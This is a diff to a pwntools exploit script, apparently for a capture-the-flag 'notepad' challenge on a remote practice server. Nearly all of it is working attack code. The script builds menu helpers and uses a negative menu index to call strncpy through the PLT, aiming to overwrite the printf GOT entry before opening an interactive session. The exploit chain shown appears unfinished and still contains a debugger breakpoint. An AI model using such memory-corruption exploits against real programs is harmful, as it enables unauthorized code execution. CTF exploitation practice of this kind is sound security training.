@@ -5,35 +5,55 @@ __Auther__ = 'M4x'
 from pwn import *
 from time import sleep
 import sys
-context.log_level = "debug"
+context.arch = 'i386'
 context.terminal = ["deepin-terminal", "-x", "sh", "-c"]
 
+elf = ELF("./notepad")
 if sys.argv[1] == "l":
-    io = process("./notepad", env = {"LD_PRELOAD": "./libc-2.23.so.i386"})
-    #  io = process("")
+    context.log_level = "debug"
+    # env = {'LD_PRELOAD': ''}
+    # io = process("", env = env)
+    io = process("./notepad")
+    libc = elf.libc
+
 
 else:
     io = remote("hackme.inndy.tw", 7713)
+    libc = ELF("./libc-2.23.so.i386")
 
-elf = ELF("./notepad")
-libc = ELF("./libc-2.23.so.i386")
-oneGadgetOffset = 0x3ac3c
 
-def DEBUG():
+def DEBUG(cmd = ""):
     raw_input("DEBUG: ")
-    gdb.attach(io)
+    gdb.attach(io, cmd)
 
-def new(size, data):
-    io.sendlineafter("::> ", "a")
+def Init():
+    io.sendlineafter("::>", "c")
+
+def New(size, content):
+    io.sendlineafter("::>", "a")
     io.sendlineafter(" > ", str(size))
-    io.sendlineafter(" > ", data)
-
-def open(idx, content):
-    io.sendlineafter("::> ", "b")
-    io.sendlineafter(" > ", str(idx))
-    io.sendlineafter("(Y/n)", "y")
     io.sendlineafter(" > ", content)
-    io.sendlineafter("::> ", "a")
+
+def Open(idx, content, choice, edit = 'n'):
+    io.sendlineafter("::>", "b")
+    io.sendlineafter(" > ", str(idx))
+    io.sendlineafter(")", edit)
+    if edit == 'y':
+        io.sendlineafter(" > ", content)
+
+    io.sendlineafter("::>", chr(choice + 97))
+
+
+if __name__ == "__main__":
+    Init()
+    New(16, p32(elf.plt['strncpy'])) # -6
+    New(16, '111')
+    DEBUG("b *0x8048CBF\nc")
+    Open(1, p32(elf.got['printf']), -6, 'y') # elf.plt['printf'] contains \x00
+
+
+    io.interactive()
+    io.close()
 
 
 
